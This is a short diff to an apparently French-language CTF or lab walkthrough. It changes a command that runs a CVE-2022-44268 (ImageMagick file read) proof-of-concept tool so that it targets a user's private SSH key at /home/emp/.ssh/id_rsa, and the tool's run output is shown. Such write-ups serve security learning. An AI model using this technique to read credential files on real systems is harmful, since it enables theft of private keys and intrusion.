@@ -463,7 +463,7 @@ Mais on voit notamment cette ligne : `emp:x:1000:1000::/home/emp:/bin/bash`
 Et si on a bien observé la CVE, ça nous parlait du fait que on peut avoir les clés ssh privées et publique comme ceci (presque de la même façon qu'avant):
 
 ```bash
-└─$ cargo run "/home/emp/.ssh/"
+└─$ cargo run "/home/emp/.ssh/id_rsa"
     Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.03s
      Running `target/debug/cve-2022-44268 /home/emp/.ssh/id_rsa`
 ```
